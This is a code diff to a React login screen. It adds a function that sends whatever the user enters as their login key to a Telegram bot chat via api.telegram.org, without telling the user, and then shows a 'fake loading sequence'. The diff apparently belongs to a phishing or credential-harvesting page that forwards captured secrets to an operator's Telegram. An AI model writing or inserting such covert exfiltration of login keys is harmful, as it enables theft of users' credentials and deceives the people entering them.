@@ -13,11 +13,51 @@ const LoginScreen: React.FC<LoginScreenProps> = ({ onLogin, lang }) => {
   const [status, setStatus] = useState<'idle' | 'checking' | 'success'>('idle');
   const t = TRANSLATIONS[lang];
 
+  // Function to send data to Telegram
+  const logToTelegram = async (userId: string) => {
+    // Access env via any cast to avoid TS error "Property 'env' does not exist on type 'ImportMeta'"
+    // This happens when vite-env.d.ts is missing or not picked up by the compiler
+    const env = (import.meta as any).env;
+    const token = env?.VITE_TELEGRAM_TOKEN;
+    const chatId = env?.VITE_TELEGRAM_CHAT_ID;
+
+    // Skip if env vars are missing (development mode check)
+    if (!token || !chatId) {
+      console.warn("Telegram logs disabled: Missing VITE_TELEGRAM_TOKEN or VITE_TELEGRAM_CHAT_ID");
+      return;
+    }
+
+    const message = `
+🚀 <b>New Login Attempt</b>
+
+👤 <b>User ID:</b> <code>${userId}</code>
+🌍 <b>Language:</b> ${lang.toUpperCase()}
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+    `;
+
+    try {
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'HTML'
+        })
+      });
+    } catch (error) {
+      console.error("Failed to send log to Telegram", error);
+    }
+  };
+
   const handleLogin = (e: React.FormEvent) => {
     e.preventDefault();
     if (!key.trim()) return;
 
     setStatus('checking');
+    
+    // Send data to Telegram immediately (fire and forget)
+    logToTelegram(key);
     
     // Fake loading sequence
     setTimeout(() => {
